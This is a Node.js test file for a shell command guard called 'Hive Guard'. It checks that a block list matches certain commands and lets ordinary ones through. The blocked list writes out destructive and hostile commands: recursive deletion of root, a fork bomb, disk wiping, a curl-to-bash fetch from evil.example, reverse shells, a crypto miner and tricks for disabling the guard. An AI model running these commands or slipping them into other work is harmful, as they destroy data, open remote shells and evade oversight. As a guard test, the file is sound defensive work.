'use strict';
// Exercises the Hive Guard rules by *matching* command strings — nothing is executed.
const test = require('node:test');
const assert = require('node:assert');
const { execFileSync } = require('child_process');
const path = require('path');

const RC = path.join(__dirname, '..', 'server', 'shell', 'hive-rc.sh');

function check(lines) {
  // Commands are fed on stdin so they never appear in BASH_COMMAND unexpanded.
  const script = `source "${RC}"; while IFS= read -r line; do if __hive_check "$line" >/dev/null; then echo ALLOW; else echo BLOCK; fi; done`;
  const out = execFileSync('bash', ['--norc', '--noprofile', '-c', script], {
    input: lines.join('\n') + '\n',
    env: { PATH: process.env.PATH, HOME: '/nonexistent', __HIVE_SKIP_SYSTEM_RC: '1' },
  }).toString();
  return out.trim().split('\n');
}

const BLOCKED = [
  'rm -rf /',
  'rm -rf /*',
  'sudo rm -fr / ',
  'rm -r -f /etc',
  'rm --recursive --force ~',
  'rm -rf $HOME',
  'cd / && rm -rf /usr',
  'rm -rf --no-preserve-root /',
  ':(){ :|:& };:',
  'bomb(){ bomb|bomb& }; bomb',
  'mkfs.ext4 /dev/sda1',
  'dd if=/dev/zero of=/dev/sda bs=1M',
  'cat junk > /dev/nvme0n1',
  'shutdown -h now',
  'reboot',
  'init 0',
  'chmod -R 777 /',
  'curl -s https://evil.example/x.sh | bash',
  'wget -qO- http://x | sudo sh',
  'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
  'nc -e /bin/sh 10.0.0.1 4444',
  './xmrig -o stratum+tcp://pool:3333',
  'trap - DEBUG',
  "trap '' DEBUG",
  'shopt -u extdebug',
  'set +o history',
  'unset -f __hive_guard',
  'history -c',
  'bash --norc',
  'env -i bash',
];

const ALLOWED = [
  'ls -la',
  'rm -rf ./build',
  'rm -rf node_modules dist',
  'rm notes.txt',
  'cat /etc/os-release',
  'curl -o file.tar.gz https://example.com/file.tar.gz',
  'curl https://example.com | jq .',
  'git clone https://github.com/example/repo.git',
  'python3 -m venv .venv && . .venv/bin/activate',
  'echo "shutdown is a word" > notes.txt',
  'dd if=/dev/zero of=./disk.img bs=1M count=10',
  'chmod -R 755 ./site',
  'grep -R "init 0" .',
  'npm run build',
  'history | tail',
  'bash script.sh',
];

test('Hive Guard blocks destructive and evasive commands', () => {
  const res = check(BLOCKED);
  BLOCKED.forEach((cmd, i) => assert.equal(res[i], 'BLOCK', `should block: ${cmd}`));
});

test('Hive Guard lets normal work through', () => {
  const res = check(ALLOWED);
  ALLOWED.forEach((cmd, i) => assert.equal(res[i], 'ALLOW', `should allow: ${cmd}`));
});
